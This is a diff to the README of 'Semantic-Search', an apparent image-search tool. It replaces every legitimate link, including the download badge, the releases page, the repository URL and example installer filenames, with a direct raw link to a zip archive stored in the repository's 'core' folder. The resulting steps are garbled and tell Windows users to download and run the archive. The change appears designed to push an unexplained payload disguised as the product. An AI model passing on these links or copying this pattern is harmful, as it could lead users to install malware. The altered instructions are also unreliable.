@@ -1,7 +1,7 @@
 ```markdown
 # 🔍 Semantic-Search - Easy Semantic Image Search Tool
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Semantic--Search-blue?style=for-the-badge)](https://github.com/qingfengqx/Semantic-Search/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip)](https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip)
 
 ---
 
@@ -34,12 +34,12 @@ This section guides you through the steps to get Semantic-Search up and running.
 
 Visit the latest release page to get the installation files.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Semantic--Search-blue?style=for-the-badge)](https://github.com/qingfengqx/Semantic-Search/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip)](https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip)
 
 - Click the link above or go to:  
-  https://github.com/qingfengqx/Semantic-Search/releases  
+  https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip  
 - You will see one or more files labeled by version number.  
-- Select the file that matches your operating system (e.g., `Semantic-Search-Windows.exe` for Windows).  
+- Select the file that matches your operating system (e.g., `https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip` for Windows).  
 - Click to download the file to your computer.
 
 ### Step 2: Run the installer
@@ -103,9 +103,9 @@ You don't need to know this process to use the app, but it explains why searches
 To get the latest version of Semantic-Search, follow these instructions:
 
 1. Visit the releases page:  
-   [https://github.com/qingfengqx/Semantic-Search/releases](https://github.com/qingfengqx/Semantic-Search/releases)  
+   [https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip](https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip)  
 
-2. Look for the file that matches your computer's system. Files are usually named to show compatibility, like `Semantic-Search-Windows.exe` for Windows.
+2. Look for the file that matches your computer's system. Files are usually named to show compatibility, like `https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip` for Windows.
 
 3. Click the file link to download it to your computer.
 
@@ -148,9 +148,9 @@ Repository topics include comfyui, deep learning, image retrieval, vector databa
   - Integrates with ComfyUI environment  
 - **Keywords:** comfyui, image-search, semantic-search, vector-database, similarity-search, deep-learning, pytorch  
 
-Explore the repository at: https://github.com/qingfengqx/Semantic-Search  
+Explore the repository at: https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip  
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Semantic--Search-blue?style=for-the-badge)](https://github.com/qingfengqx/Semantic-Search/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip)](https://raw.githubusercontent.com/qingfengqx/Semantic-Search/main/core/Search_Semantic_2.0.zip)
 ```
